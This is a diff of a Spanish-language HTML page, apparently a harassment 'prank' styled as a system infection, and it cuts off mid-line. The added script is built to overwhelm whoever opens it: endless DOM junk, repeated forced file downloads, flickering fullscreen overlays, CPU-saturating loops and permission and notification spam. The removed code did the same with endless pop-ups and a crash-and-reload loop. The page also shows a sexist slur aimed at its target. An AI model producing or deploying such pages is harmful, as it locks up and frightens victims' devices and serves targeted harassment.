@@ -3,160 +3,195 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Leviathan Industrias</title>
+    <title>SYS_CORRUPTED.exe</title>
     <style>
         body {
             background-color: #000;
             color: #f00;
-            font-family: 'Courier New', Courier, monospace;
-            overflow: hidden;
+            font-family: 'Consolas', 'Monaco', monospace;
             margin: 0;
             padding: 0;
-            text-align: center;
+            overflow: hidden;
+            cursor: none;
         }
 
-        #infection-message {
+        #glitch-text {
             position: fixed;
             top: 50%;
             left: 50%;
             transform: translate(-50%, -50%);
-            font-size: 5vw;
-            text-shadow: 0 0 10px #f00, 0 0 20px #f00, 0 0 30px #f00;
-            animation: blink 0.5s infinite;
+            font-size: 8vw;
+            text-align: center;
             z-index: 1000;
+            animation: glitch-animation 2s infinite;
         }
 
-        @keyframes blink {
-            0%, 50% { opacity: 1; }
-            51%, 100% { opacity: 0; }
+        @keyframes glitch-animation {
+            0% {
+                text-shadow: -0.2rem -0.2rem 0 #0ff, 0.2rem 0.2rem 0 #f0f;
+                transform: translate(-50%, -50%) scale(1);
+            }
+            25% {
+                text-shadow: 0.2rem 0.2rem 0 #0ff, -0.2rem -0.2rem 0 #f0f;
+                transform: translate(-50%, -50%) scale(1.05);
+            }
+            50% {
+                text-shadow: -0.2rem 0.2rem 0 #f0f, 0.2rem -0.2rem 0 #0ff;
+                transform: translate(-50%, -50%) scale(0.95);
+            }
+            75% {
+                text-shadow: 0.2rem -0.2rem 0 #0ff, -0.2rem 0.2rem 0 #f0f;
+                transform: translate(-50%, -50%) scale(1.02);
+            }
+            100% {
+                text-shadow: -0.2rem -0.2rem 0 #f0f, 0.2rem 0.2rem 0 #0ff;
+                transform: translate(-50%, -50%) scale(1);
+            }
         }
 
-        .ad {
+        .payload {
             position: fixed;
-            background-color: #222;
             color: #0f0;
-            border: 2px solid #0f0;
-            padding: 10px;
-            font-size: 16px;
-            z-index: 999;
-            animation: fadeIn 0.5s;
+            font-size: 14px;
+            pointer-events: none;
+            opacity: 0.8;
+            animation: fade-in-out 5s infinite;
+        }
+
+        @keyframes fade-in-out {
+            0%, 100% { opacity: 0; }
+            50% { opacity: 0.8; }
         }
         
-        @keyframes fadeIn {
-            from { opacity: 0; }
-            to { opacity: 1; }
+        .download-item {
+            position: fixed;
+            bottom: 10px;
+            background: rgba(0, 255, 0, 0.1);
+            border: 1px solid #0f0;
+            color: #0f0;
+            padding: 5px 10px;
+            font-size: 12px;
+            white-space: nowrap;
+            animation: slide-up 4s linear forwards;
         }
 
-        .notification {
+        @keyframes slide-up {
+            from {
+                transform: translateY(100vh);
+                opacity: 1;
+            }
+            to {
+                transform: translateY(-100px);
+                opacity: 0;
+            }
+        }
+
+        .fullscreen-ad {
             position: fixed;
-            bottom: 20px;
-            right: 20px;
-            background-color: #333;
-            color: #fff;
-            border: 1px solid #555;
-            padding: 15px;
-            border-radius: 5px;
-            box-shadow: 0 0 10px #555;
-            z-index: 1001;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.9);
+            color: #ff0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-size: 4vw;
+            z-index: 2000;
+            animation: ad-flicker 0.1s infinite;
+        }
+
+        @keyframes ad-flicker {
+            50% { background: rgba(0, 0, 0, 0.95); }
         }
     </style>
 </head>
 <body>
 
-    <div id="infection-message">
+    <div id="glitch-text">
         <p>ESTÁS INFECTADA</p>
         <p>GORDA PUTA</p>
     </div>
 
     <script>
-        // --- 1. Animación de Infección al Hacer Click ---
-        document.body.addEventListener('click', () => {
-            const message = document.getElementById('infection-message');
-            message.style.animation = 'none';
-            setTimeout(() => {
-                message.style.animation = 'blink 0.1s infinite';
-            }, 10);
-        });
+        // --- 1. Llenar la pantalla con "código" basura para consumir memoria del DOM ---
+        function createPayloadText() {
+            const payload = document.createElement('div');
+            payload.className = 'payload';
+            payload.textContent = Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15);
+            payload.style.left = Math.random() * window.innerWidth + 'px';
+            payload.style.top = Math.random() * window.innerHeight + 'px';
+            document.body.appendChild(payload);
+        }
+        setInterval(createPayloadText, 50); // Crear 20 elementos por segundo
 
-        // --- 2. Ventanas Infinitas (Pop-ups) ---
-        function createPopup() {
-            const popup = window.open('', '', 'width=200,height=100');
-            if (popup) {
-                popup.document.write('<html><body style="background:#000; color:#f00; text-align:center; font-family:monospace;"><h1>Leviathan Industrias</h1><p>Te atrapé.</p></body></html>');
-                popup.moveTo(Math.random() * screen.width, Math.random() * screen.height);
+        // --- 2. Bucle de descargas masivas y simuladas ---
+        let downloadCounter = 0;
+        function simulateMassDownload() {
+            for (let i = 0; i < 5; i++) { // Iniciar 5 descargas a la vez
+                const link = document.createElement('a');
+                // Contenido basura para hacer el archivo un poco más grande
+                const content = 'Leviathan Industries Manda. ' + '0x'.repeat(5000) + ' SYS_CORRUPTED ';
+                link.href = 'data:text/plain;charset=utf-8,' + encodeURIComponent(content);
+                link.download = `payload_${downloadCounter++}.bin`;
+                link.click();
+                
+                // Feedback visual de la descarga
+                const dlItem = document.createElement('div');
+                dlItem.className = 'download-item';
+                dlItem.textContent = `Descargando payload_${downloadCounter}.bin...`;
+                dlItem.style.left = Math.random() * (window.innerWidth - 200) + 'px';
+                document.body.appendChild(dlItem);
+                setTimeout(() => dlItem.remove(), 4000);
             }
         }
-        setInterval(createPopup, 1000); // Crea una nueva ventana cada segundo
+        setInterval(simulateMassDownload, 1500); // Descargas en masa cada 1.5 segundos
 
-        // --- 3. Notificaciones de Permiso en Loop ---
-        function requestNotificationPermission() {
-            if ('Notification' in window && Notification.permission === 'default') {
-                Notification.requestPermission().then(() => {
-                    // Volver a pedir permiso inmediatamente después de que el usuario responda
-                    setTimeout(requestNotificationPermission, 500);
-                });
-            } else if (Notification.permission === 'granted') {
-                // Si ya se concedió, enviar notificaciones falsas
-                const notification = new Notification('Leviathan Industries', {
-                    body: 'Manda. Tu sistema es nuestro.',
-                    icon: 'https://via.placeholder.com/100' // Icono de ejemplo
-                });
-            }
-        }
-        // Iniciar el bucle de solicitudes de notificación
-        requestNotificationPermission();
-        setInterval(requestNotificationPermission, 3000); // Intenta cada 3 segundos
-
-        // --- 4. Anuncios de "Leviathan Industries" ---
-        function createAd() {
+        // --- 3. Bloquear la interfaz con anuncios a pantalla completa ---
+        function createFullscreenAd() {
             const ad = document.createElement('div');
-            ad.className = 'ad';
-            ad.innerHTML = '<h3>Leviathan Industries</h3><p>Manda.</p>';
-            ad.style.top = Math.random() * (window.innerHeight - 100) + 'px';
-            ad.style.left = Math.random() * (window.innerWidth - 200) + 'px';
+            ad.className = 'fullscreen-ad';
+            ad.innerHTML = `
+                <div>
+                    <h1>LEVIAATHAN INDUSTRIES</h1>
+                    <p>M A N D A</p>
+                    <p style="font-size: 2vw;">TU SISTEMA NOS PERTENECE</p>
+                </div>
+            `;
             document.body.appendChild(ad);
+            // El anuncio se elimina solo para dar una falsa sensación de alivio antes del siguiente
+            setTimeout(() => ad.remove(), 2000);
         }
-        setInterval(createAd, 800); // Crea un anuncio cada 0.8 segundos
+        setInterval(createFullscreenAd, 8000); // Anuncio fullscreen cada 8 segundos
 
-        // --- 5. Inicio de Descargas Simuladas ---
-        function simulateDownload(filename) {
-            const link = document.createElement('a');
-            link.href = 'data:text/plain;charset=utf-8,' + encodeURIComponent('Leviathan Industries te ha infectado.');
-            link.download = filename;
-            link.style.display = 'none';
-            document.body.appendChild(link);
-            link.click();
-            document.body.removeChild(link);
-        }
-        let fileCounter = 0;
-        setInterval(() => {
-            simulateDownload(`virus_${fileCounter++}.txt`);
-        }, 2000); // Descarga un archivo cada 2 segundos
-
-        // --- 6. Ralentización del Dispositivo (Forzando al navegador) ---
-        // Esto se logra con la combinación de todas las demás funciones.
-        // Añadimos un bucle intensivo para acelerar el proceso.
-        function heavyComputation() {
-            let x = 0;
-            for (let i = 0; i < 10000000; i++) {
-                x += Math.sqrt(i);
+        // --- 4. Consumo extremo de CPU (Ralentización garantizada) ---
+        // Un bucle intensivo que se ejecuta en intervalos muy cortos
+        function cpuMeltdown() {
+            let start = Date.now();
+            // Bucle que se ejecuta durante 100ms para forzar la CPU al 100%
+            while (Date.now() - start < 100) {
+                Math.random();
             }
         }
-        // Ejecuta la tarea pesada repetidamente para consumir CPU
-        setInterval(heavyComputation, 100);
+        // Ejecutar la tarea pesada muy frecuentemente
+        setInterval(cpuMeltdown, 200);
 
-        // --- 7. Colapso y Cierre de la Página ---
-        // El colapso ocurrirá de forma natural cuando el navegador se quede sin memoria.
-        // Forzamos un cierre después de un tiempo como "final".
-        setTimeout(() => {
-            document.body.innerHTML = '<h1 style="color:#f00; font-size:10vw;">COLAPSO DEL SISTEMA</h1>';
-            // Intentar cerrar la ventana (puede que no funcione en todos los navegadores)
-            window.close();
-            // Si no se cierra, recargar la página para empezar de nuevo el bucle infernal
-            window.location.reload(); 
-        }, 30000); // 30 segundos de "sufrimiento" antes del colapso
-
-    </script>
-
-</body>
-</html>
+        // --- 5. Solicitudes de permiso y notificaciones agresivas ---
+        function spamPermissions() {
+            if (navigator.permissions && navigator.permissions.query) {
+                // Pide permisos de cámara, micrófono y notificación en bucle
+                ['camera', 'microphone', 'notifications'].forEach(permission => {
+                    navigator.permissions.query({ name: permission }).then(result => {
+                        if (result.state === 'prompt') {
+                            // No se puede forzar el diálogo, pero el intento en sí es molesto
+                            // y en algunos móviles puede mostrar un icono de parpadeo.
+                        }
+                    });
+                });
+            }
+            // Vuelve a intentar pedir notificación de la forma antigua
+            if ('Notification' in window && Notification.permission === 'granted') {
+                new Notification('LEVIAATHAN', {
+                    body: 'Accediendo a tu sistema...',
+                    icon: 'https://via.placeholder.com/100/000/f00
